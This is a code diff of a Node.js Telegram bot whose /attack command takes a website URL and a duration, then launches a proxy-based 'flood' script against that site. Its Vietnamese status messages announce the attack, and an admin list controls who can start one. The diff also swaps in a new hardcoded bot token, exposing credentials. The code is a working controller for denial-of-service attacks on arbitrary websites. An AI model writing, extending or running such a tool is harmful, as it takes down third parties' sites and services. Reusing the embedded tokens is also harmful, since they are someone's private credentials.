@@ -2,7 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { spawn } = require('child_process');
 const path = require('path');
 
-const token = '8137586678:AAGKpWboi-ZExKV2R2ou7RV3Jz6Gy80Fi-8';
+const token = '7651331068:AAEQUBeNlW6a7WznGSp1gzGdn36l-BLy0Tk';
 const bot = new TelegramBot(token, { polling: true });
 
 let ADMIN_IDS = [7818408538];
@@ -43,7 +43,7 @@ bot.onText(/\/attack (https?:\/\/[^\s]+) (\d+)/, (msg, match) => {
   const thread = '9';
   const proxy = '9.txt';
   const method = 'flood';
-  const scriptPath = path.join(__dirname, 'bypass.js');
+  const scriptPath = path.join(__dirname, 'c.js');
 
   bot.sendMessage(chatId, `🚀Tool by thuandz Bat đau attack vao ${url} trong ${duration} giay!`);
 
@@ -125,6 +125,7 @@ bot.onText(/\/add (\d+)/, (msg, match) => {
   ADMIN_IDS.push(newAdminId);
   bot.sendMessage(chatId, `✅ Đa them admin moi voi ID: ${newAdminId}`);
 });
+
 
 
 
